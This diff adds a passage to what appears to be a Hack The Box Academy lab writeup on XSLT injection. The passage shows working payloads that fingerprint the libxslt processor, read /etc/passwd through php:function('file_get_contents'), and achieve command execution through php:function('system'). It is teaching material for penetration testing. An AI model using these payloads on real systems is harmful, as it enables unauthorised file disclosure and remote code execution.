@@ -837,3 +837,103 @@ An XSLT injection vulnerability occurs when user-controlled input is inserted in
 ---
 
 ### Exploiting XSLT
+
+The target application displays basic information about various Hack The Box Academy modules.
+
+![Filtered output](images/xslt.png)
+
+At the bottom of the page, the user is prompted to provide a name, which is then incorporated into the page header:
+
+```
+Please provide your name to customize your list:
+```
+
+![Filtered output](images/xslt2.png)
+
+The supplied name is reflected at the top of the page:
+
+```
+Hi Sam, here are your favorite Academy modules:
+```
+
+![Filtered output](images/xslt3.png)
+
+If the application stores module data in an XML document and renders it using XSLT, user-controlled input embedded into the XSL template may result in an XSLT injection vulnerability.
+
+To test for XSLT injection, we inject a malformed XML character (`<`) to intentionally break the XML structure:
+
+```bash
+94.237.56.99:33204/index.php?name=<
+```
+
+The application responds with a `500 Internal Server Error`. While this behavior alone does not conclusively prove XSLT injection, it strongly suggests that user input is being processed by an XML/XSLT parser.
+
+XSLT provides the `system-property()` function, which can be used to extract information about the underlying XSLT processor. The following payloads are useful for reconnaissance:
+
+```xml
+<xsl:value-of select="system-property('xsl:version')" />
+```
+
+```xml
+<xsl:value-of select="system-property('xsl:vendor')" />
+```
+
+```xml
+<xsl:value-of select="system-property('xsl:vendor-url')" />
+```
+
+```xml
+<xsl:value-of select="system-property('xsl:product-name')" />
+```
+
+```xml
+<xsl:value-of select="system-property('xsl:product-version')" />
+```
+
+These values can be combined into a single payload for convenience:
+
+```xml
+Version: <xsl:value-of select="system-property('xsl:version')" />
+<br/>
+Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
+<br/>
+Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
+<br/>
+Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
+<br/>
+Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
+```
+
+![Filtered output](images/xslt5.png)
+
+The response confirms that the application is vulnerable to XSLT injection and reveals that it uses the `libxslt` processor with XSLT version `1.0`.
+
+Several functions can be used to read local files, depending on the XSLT version and processor configuration. The `unparsed-text()` function is commonly used for this purpose:
+
+```xml
+<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
+```
+
+However, this function was introduced in XSLT `2.0` and is therefore unavailable in this environment.
+
+If PHP function support is enabled (a common misconfiguration when using `libxslt` with PHP), we can instead leverage PHP’s `file_get_contents()` function:
+
+```xml
+<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
+```
+
+![Filtered output](images/xslt6.png)
+
+This confirms successful local file inclusion and further validates that PHP functions are accessible from within the XSLT context.
+
+Since arbitrary PHP functions are allowed, we can escalate from file disclosure to remote code execution by invoking the `system()` function:
+
+```xml
+<xsl:value-of select="php:function('system','ls -la')" />
+```
+
+![Filtered output](images/xslt7.png)
+
+The command executes successfully on the server, resulting in full remote code execution via XSLT injection.
+
+---
